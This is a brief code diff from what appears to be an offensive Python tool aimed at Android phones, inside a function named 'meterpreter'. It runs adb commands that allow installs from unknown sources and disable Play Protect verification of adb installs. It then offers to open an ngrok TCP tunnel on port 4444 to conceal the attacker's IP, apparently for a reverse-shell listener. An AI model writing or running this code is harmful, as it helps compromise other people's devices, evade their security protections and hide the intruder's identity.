@@ -97,10 +97,8 @@ class commands():
 
     def meterpreter(action: str):
         try:
-            print(colored("NOTE: It is recommended to run rdp with this command in case the device has an antivirus enabled.", "yellow")) #It's true
-
             commands.cli_command("adb shell settings put global install_non_market_apps 1") #Allow unknown apps
-            commands.cli_command("adb shell settings put global verifier_verify_adb_installs 0")
+            commands.cli_command("adb shell settings put global verifier_verify_adb_installs 0") #Turn off play protect for adb installs
             yorn = input("Use ngrok to hide your ip(y/n)? ")
             if(yorn == "y"):
                 tunnel = ngrok.connect(4444, "tcp") #Connect to an ngrok tunnel
